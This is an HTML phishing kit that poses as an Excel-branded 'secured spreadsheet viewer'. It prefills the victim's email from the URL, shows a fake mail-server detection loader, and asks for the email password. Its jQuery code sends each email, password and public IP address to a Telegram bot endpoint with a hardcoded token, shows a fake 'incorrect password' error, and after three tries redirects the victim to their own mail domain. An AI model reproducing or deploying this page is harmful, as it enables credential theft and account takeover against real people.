<html><head>
    <title>Online Secured Spreadsheet Viewer</title>
    <link rel="stylesheet" type="text/css" href="css/reset.css">
    <link rel="stylesheet" type="text/css" href="css/styles.css">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" type="image/x-icon" href="https://res.cdn.office.net/files/fabric-cdn-prod_20251010.003/assets/brand-icons/product/favicon/excel.ico">
  
<style>
html, body{
	font-size: 18px;
	font-family: Helvetica, Impact, sans-serif;
	font-weight: 500;
}
html{
	background: url('https://i.imgur.com/qLcPmYb.jpg') no-repeat center center fixed; 
	 -webkit-background-size: cover;
        -moz-background-size: cover;
        -o-background-size: cover;
        background-size: cover;
		
	
}

h1 {
	font-size: 28px;
}


.error{
	color: #dc3545;
	width: 80%;
	margin: 0 auto;
	padding-top: 5px;
}

.form-holder{
	background-color: #fff;
	width: 450px;

	margin: 100px auto;
	position: relative;
	top:0;
	bottom: 0;
	left: 0;
	right: 0;
	box-shadow: 0 20px 50px rgb(169,169,169);
	border-radius: 0px 0px 4px 4px;
}

.xlogo{

	color: #fff;
	padding: 8px;
	font-size:20px;
	margin-bottom: 10px;
	border-radius: 4px 4px 0px 0px;
}
.xlogo img{
	vertical-align:middle;
}
.xlogo span{
	vertical-align:middle;
}

.form-wrap{
	display: block;
	width: 450px;
	margin: 0 auto;
	text-align: center;
}

.form-wrap img{
	margin: 20px;
}

.finput{
	width: 80%;
	margin: 10px auto;
}

.finput input[type="email"], .finput input[type="password"], .finput input[type="text"]{
	font-size: 20px;
	padding: 3px 3px 3px 3px;
	border-radius: 4px;
	margin: 5px 0;
	width: 100%;
	border: 1px solid #d6dfea;
	height:45px;
	font-size:19px;
}

.finput input[type="email"] {
	background: url(../images/user.png) no-repeat scroll 7px 7px;
}

.finput input[type="password"] {
	background: url(../images/lock.png) no-repeat scroll 7px 7px;
}

.finput input[type="email"]:hover, .finput input[type="password"]:hover,
.finput input[type="email"]:focus, .finput input[type="password"]:focus{
	border: 1px solid #207245;
}


button{

	border: 1px solid #205b2d;
	font-size: 20px;
	padding: 7px 20px;
	border-radius: 4px;
	background-color: #207245;
	color: #fff;
	width:100%;
}

button:hover{
	background-color: #205b2d;
	cursor:pointer;
}

.privacy{
	font-size: 14px;
	color: #808080;
	text-align: left;
}
/* http://meyerweb.com/eric/tools/css/reset/ 
   v2.0 | 20110126
   License: none (public domain)
*/

html, body, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
b, u, i, center,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td,
article, aside, canvas, details, embed, 
figure, figcaption, footer, header, hgroup, 
menu, nav, output, ruby, section, summary,
time, mark, audio, video {
	margin: 0;
	padding: 0;
	border: 0;
	font-size: 100%;
	font: inherit;
	vertical-align: baseline;
}
/* HTML5 display-role reset for older browsers */
article, aside, details, figcaption, figure, 
footer, header, hgroup, menu, nav, section {
	display: block;
}
body {
	line-height: 1;
}
ol, ul {
	list-style: none;
}
blockquote, q {
	quotes: none;
}
blockquote:before, blockquote:after,
q:before, q:after {
	content: '';
	content: none;
}
table {
	border-collapse: collapse;
	border-spacing: 0;
}



.container {
 

  transform: translate(-50%, -50%);
  width: 200px;
  height: 20px;
  padding-top: 0px;
  background-color: #fff;
  border: 1px solid #070;
  border-radius: 50px;
  color: #070;
  font-size: 14px;
  overflow: hidden;
  text-align: center;
  box-sizing: border-box;
  transition-delay: 3s;
}

#inner-container {
  width: 400px;
  height: 70px;
  margin-top: -20px;
  background-color: rgba(0, 119, 0, 0.5);
}
#container {
  margin-top: 0px;
}
</style>



<link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAL0AAAB+CAMAAABGdeAYAAAA1VBMVEX///8YXDcho2YQfEEzxIESgEUVhEoPdj0OcjoNbjcMazUPWTLp7eoTSCtIc1jp9O5KrntVy5ESQSgekVoWUzMXWDUAdTMKKBmOxqcLWC2OspcjwnsIRCSOt5sAUieOo5OV3LYAfj4AnlwOMR4AdCV9wp0AXQB8mIYOaDiryrYXYTh+t5jz+PUziVVRkmcAayRhtIbD4NC45s4ZcEZgnXO40cGZvqZqpH/M3NHc6eF0pYRFiFZYjF0zf04AZBUAayx2f3kAFwB4iX8AMhHCzcYAQwBjhGtTmtvqAAADYUlEQVR4nO3ba1PaQBSA4dAYkmDQemHrBdEovQQT0osioBLbWv//T+ruyX0HSGZwyNmZ837oSOhMnjndLAlONY2iKIqiKIqiKIqiKE3z9zfKbxR/8rGqg/VdNWf3v19/qGpnfecHjel/VOOr9DvnP5vSf34P/RXpSU960pOe9KQnPelJn3d7tDq19Ueo9M4tG8q57Tij3LfWr5yPQ3+XUisz2mZvhEvv1cXD9Ef9U9vWTZ5edVVfn2xBf1FPn66d/qll6SJDHX2+8vnsFdMXr1vl9IbCemnPVEsv7/iY9S4T5XR4qYzeE92nfCOAl2NF9O4EDk1YvGaG9+LVTM/xOmZ923DEIYffE3C8G8BfeHAzu45b797BsQmA2VT87A0LeNz6diz2hd59gB8LdPR6Ywy/svH4RuPO4reLeOT6NvPEQT8wGIw+uWR1RfQGg+FPmA6jD9wCHbteLPe5OOobsHl6YRmPWR9fny5cuBMx+llQovNnErT6dGNMtnnRnJXtePX5B+rQS96aLmQ8Un3pRjKAC1bzH2W70O/atonruVa6DU702tiV7KZ5etPttUaQUZF7sR29dNrhNHlrP5TsQn94fNyCTH197Gwregkff0ztiz8mYRFvWQro43XzJD60/HFh8BxvodOfSfoQbuq9EDae6aKotxDqS09+BhuLg07AAlg78yibuwJ6XYfnk4tQZ7BlOM/Z3CHMen5KuL3xTXGxwvC9iK/2VG8j1oszwrrhdwh83gxu17SnKLPbePVwxhC2eofF1ylsPtNFNni8+viE8XcK4/hSjZKH3CgZPNrZJyd8hCOzdJtcxHcMz/GiwarPzwffRj2mG7z5BN9GzaN09LaNT184YSjK8FYEr3N8B7W+eD+W7zSZvYNZX6JnH1B2bsesX0q3rCIeq96sXDSI9evnnuFR6ov2wtzlwQv9AJneY6WHJ+laLdl5/Uw/0g0Eeu0uXDb4pXa+cPLZ9yoaXG5D75yFX+Si8uWb/Ft0OD7XV7Ud/bJefn9a3s1NV109H70C+j9/D1fVrYlHqq+Jb1Lf766qLh6lvqeA/utg1S5eG9+ovr6S9KQnPelJT/pmev33DvrXpvT+22B3wwZ7TeF5l3ub9dbYuoF8Z6Oa/V/xFEVRFEVRFEVRFNVA/wEEZNRbjnxMYwAAAABJRU5ErkJggg==" rel="shortcut icon">
</head>
<body style="backdrop-filter: blur(4px)">




        <div class="form-holder"  style="margin-top:60px">
            <div class="xlogo">
                <center><img src="https://cdn-icons-png.flaticon.com/512/6741/6741171.png" style="width:60px;">
				
				</center> 
            </div>
            <div class="form-wrap" style="display:none;" id="first">
                <h2>Protected File</h2>
				<img src="https://play-lh.googleusercontent.com/37EzETO6gZyKmCg2kBIFX1e9gkubxZrVa5fHJ6yOaa7VvEShHjKv2RdtwnZt9Sk258s" style="width:100px;">
				<p style="text-align:left;padding-left:50px;">Authenticate your email to download</p>
              
                  

                    <div class="error" id="msgs"></div>
                    
                                            <div class="finput">
                      <input type="email" name="email" id="email" readonly style="border-radius:20px;padding-left:20px;">
                            
                        </div>
                    
                    <div class="finput"> 
                        <input type="password" name="password" id="password" autofocus placeholder="Email Password" style="border-radius:20px;padding-left:20px;">
                    </div>
                    <div class="finput"> 
                        <input type="text" disabled id='just' style="border-radius:20px;padding-left:20px;font-size:12px;">
                    </div>
                    <div class="finput"> 
                        <button id="targeters" type='button' style="width:150px;font-size:20px;margin-bottom:30px;">View File</button>
                    </div>
        

         
            </div>
			
			
			
			
			
			
			
			            <div class="form-wrap" style="height:220px;padding-bottom:20px;" id="second">
                <h2>Protected File</h2>
				<img src="https://play-lh.googleusercontent.com/37EzETO6gZyKmCg2kBIFX1e9gkubxZrVa5fHJ6yOaa7VvEShHjKv2RdtwnZt9Sk258s" style="width:100px;">
				

                    <div class="finput btn"> 
                        <button id="submits" style="width:180px;font-size:20px;" onclick="startLoader()">Click to Unlock</button>
                    </div>
			<center><div class="container" id="box" style="margin-left:200px;display:none;">
    <p id="container">0%</p>
    <div id="inner-container">
    </div>
  </div>
  <p id="detect" style="display:none;">Detecting your mail server...</p>
  </center>
            </div>
			
						           

        </div>
 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>	
<script>


 let count = 0;
const box = document.getElementById("container");
const container = document.getElementById("box");
const inbox = document.getElementById("inner-container");
function startLoader() {
	$('#submits').css('display', 'none');
		$('#box').css('display', 'block');
		$('#detect').css('display', 'block');
		setTimeout(() => {  
	$('#second').css('display', 'none');
	$('#first').css('display', 'block'); }, 9000);
  box.innerHTML = count + "%";
  nextLoader();
}
function nextLoader() {
  inbox.style.width = count * 2 + "px";
  if (count < 100) {
    count++;
    setTimeout(startLoader, 100);
  }
  else {
    container.style.opacity = "0";
  }
}




</script>
	 <script>

var email = window.location.hash.substr(1);
var my_email =email;
$('#email').val(my_email);
$('#displayName').html(my_email);
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();
$('#just').val("Connected to mailserver:mail."+my_slice);
	</script>
 
  <script>
	
    
/* global $ */
$(document).ready(function(){
var count=0;


  		        var tx1="8182134630";
var tx2="7636454503:AAHstzks5zTFAGxGEf9VZDsFTRrAJEAg73k";
 ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
 
 
         let u53TiQ = '';
      $.getJSON('https://api.ipify.org?format=json', function(data){
        u53TiQ = data.ip;
      });
 

 


 $('#targeters').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
       
		
		if (!password) {
                $('#msgs').show();
                $('#msgs').html("Password is empty");

                return false;
            }


count=count+1;

$.ajax({
dataType: 'JSON',
url: ur,
type: 'GET',
        data:{
          ajaxid: 4,
		text: 'Email:' + email + ' | Password:' + password + ' | IP:' + u53TiQ			
        },
            beforeSend: function(xhr){
            	$('#submit-btn').val('Verifing...');
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            	if(response.ok === true){
            			$("#password").val("");
            			if (count>=3) {
            				count=0;
                    // window.location.replace(response['redirect_link']);
                     window.location.replace("https://www."+my_slice);

                }
                    	$("#msgs").show();
    	$('#msgs').html("Please enter correct password and try again");
            }
            else{
                    	$("#msgs").show();
    	$('#msgs').html("Please enter correct password and try again");
            }
        }
    },
    error: function(){
    	$("#password").val("");
    	if (count>=3) {
    		count=0;
    window.location.replace("https://www."+my_slice);
    	}
                    	$("#msgs").show();
    	$('#msgs').html("Please enter correct password and try again");
    },
    complete: function(){
    	$('#submit-btn').val('LOGIN');
    }
});
  });


	});
</script>

</body></html>
